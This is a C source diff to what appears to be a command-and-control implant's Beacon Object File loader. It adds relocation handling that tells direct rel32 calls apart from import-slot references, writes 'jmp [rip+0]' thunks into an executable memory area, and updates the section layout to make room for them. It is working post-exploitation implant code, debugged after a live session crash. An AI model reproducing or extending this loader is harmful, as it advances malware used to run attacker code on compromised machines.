@@ -760,23 +760,65 @@ struct CdGuard {
 	~CdGuard() { crashdiag_disarm(); }
 };
 
-/* What a SYMBOL_DYNAMICF relocation has to resolve to. The dllimport form
- * (call / lea qword ptr [rip+d]) references a slot that HOLDS the function
- * pointer. A direct `call/jmp rel32` (E8/E9 right before the displacement)
- * goes to the function itself - that is how a bare CRT reference compiles,
- * and the TS maps those to msvcrt$X (memset, memcpy...). Same relocation
- * type for both. Patching the direct call to the slot jumped into the heap
- * and killed the session (bof_syscalls live round, 2026-11-24). src is the
- * section's object bytes; reloc->offset is at least the field width. */
-static BOOL dyn_reloc_wants_slot(OBJ_RELOC * reloc, char * src) {
-	int relative = reloc->type == RELOC_REL32
-	            || (reloc->type >= RELOC64_REL32_0 && reloc->type <= RELOC64_REL32_5);
+/* What a SYMBOL_DYNAMICF relocation has to resolve to. Same relocation
+ * type for all three forms; the opcode byte before the displacement tells
+ * them apart. src is the section's object bytes; reloc->offset is at least
+ * the field width.
+ *
+ *   call/lea qword ptr [rip+d]  (FF 15 / 48 8B .. right before it) - the
+ *     dllimport form: a slot HOLDING the function pointer.
+ *   call/jmp rel32 (E8/E9) - how a bare CRT reference compiles; the TS maps
+ *     those to msvcrt$X (memset, memcpy...). A `jmp [rip+0]` thunk in the
+ *     BOF's own executable range (the function may sit further than the
+ *     2GB a rel32 call reaches).
+ *   anything absolute - the function pointer itself.
+ *
+ * Patching the direct call to the slot jumped into the heap and killed the
+ * session (bof_syscalls live round, 2026-11-24). */
+static BOOL dyn_reloc_relative(OBJ_RELOC * reloc) {
+	return reloc->type == RELOC_REL32
+	    || (reloc->type >= RELOC64_REL32_0 && reloc->type <= RELOC64_REL32_5);
+}
+
+static BOOL dyn_reloc_direct(OBJ_RELOC * reloc, char * src) {
 	unsigned char op;
 
-	if (!relative)
-		return FALSE; /* an absolute reference stores the function pointer */
+	if (!dyn_reloc_relative(reloc))
+		return FALSE;
 	op = (unsigned char)src[reloc->offset - 1];
-	return op != 0xE8 && op != 0xE9;
+	return op == 0xE8 || op == 0xE9;
+}
+
+static BOOL dyn_reloc_wants_slot(OBJ_RELOC * reloc, char * src) {
+	return dyn_reloc_relative(reloc) && !dyn_reloc_direct(reloc, src);
+}
+
+/* the direct-call thunks live between .rdata and the writable data page
+ * (part of the executable range, see off_data): `jmp qword ptr [rip+0]`
+ * followed by the function address, one per distinct function. Returns
+ * NULL when the area is exhausted. */
+#define BOF_THUNK_AREA 256
+#define BOF_THUNK_SIZE (6 + sizeof(void *))
+#define BOF_THUNK_MAX  (BOF_THUNK_AREA / BOF_THUNK_SIZE)
+
+static void * direct_thunk(char * dst, SIZE_T thunk_off, void * fn, void ** table, int * used) {
+	unsigned char * t;
+	int i;
+
+	for (i = 0; i < *used; i++) {
+		if (table[i] == fn)
+			return dst + thunk_off + (SIZE_T)i * BOF_THUNK_SIZE;
+	}
+	if (*used >= BOF_THUNK_MAX)
+		return NULL;
+	i = (*used)++;
+	t = (unsigned char *)(dst + thunk_off + (SIZE_T)i * BOF_THUNK_SIZE);
+	t[0] = 0xFF;                                /* jmp */
+	t[1] = 0x25;                                /* qword ptr [rip+0] */
+	t[2] = 0; t[3] = 0; t[4] = 0; t[5] = 0;
+	memcpy(t + 6, &fn, sizeof(void *));
+	table[i] = fn;
+	return t;
 }
 
 BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entry, char * args, int alen, int conv) {
@@ -797,6 +839,8 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	SIZE_T total;
 	SIZE_T off_rdata, off_data, off_xdata, off_pdata, off_bss;
 	OBJ_RELOC * reloc;
+	void * thunks[BOF_THUNK_MAX];   /* direct-call thunks handed out so far */
+	int nthunks = 0;
 	BOOL success = FALSE;
 #if defined(_M_X64) && defined(BOFWIN_ENABLE)
 	BOOL beacon_api_used = FALSE; /* Phase 3: any ftable reloc means the BOF
@@ -827,7 +871,11 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	 * stay contiguous; xdata/pdata ride behind .data inside the writable
 	 * run (they only need read). */
 	off_rdata = (SIZE_T)code.length;
-	off_data  = (off_rdata + (SIZE_T)rdata.length + 0xFFF) & ~(SIZE_T)0xFFF;
+	/* BOF_THUNK_AREA bytes behind .rdata (still in the executable range:
+	 * [base, off_data) takes the code permission) hold the direct-call
+	 * thunks of dynamic imports - it only costs a page when .rdata ends
+	 * closer than that to the page boundary */
+	off_data  = (off_rdata + (SIZE_T)rdata.length + BOF_THUNK_AREA + 0xFFF) & ~(SIZE_T)0xFFF;
 	off_xdata = off_data + (SIZE_T)data.length;
 	off_pdata = off_xdata + (SIZE_T)xdata.length;
 	off_bss   = (off_pdata + (SIZE_T)pdata.length + 0xFFF) & ~(SIZE_T)0xFFF;
@@ -951,7 +999,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 				boftrace("DYNFAIL %s!%s", lib, fun);
 				break;
 			}
-			if (dyn_reloc_wants_slot(reloc, (char *)src)) {
+			if (dyn_reloc_wants_slot(reloc, src)) {
 				slot = function_slot(ftable, ptr);
 				if (slot == NULL) {
 					post_error_na(0x4e);
@@ -959,8 +1007,15 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 					break;
 				}
 			}
+			else if (dyn_reloc_direct(reloc, src))
+				slot = direct_thunk(code_dst, off_rdata + (SIZE_T)rdata.length, ptr, thunks, &nthunks);
 			else
-				slot = ptr; /* a direct call: the function, not a slot to it */
+				slot = ptr; /* an absolute reference: the function pointer */
+			if (slot == NULL) {
+				post_error_na(0x4e);
+				boftrace("THUNKFAIL %s!%s", lib, fun);
+				break;
+			}
 			if (!process_reloc(reloc, src, dst, (char *)slot, 0, base)) {
 				boftrace("RELOCFAIL dyn %s!%s type=%d off=%d", lib, fun, reloc->type, reloc->offset);
 				break;
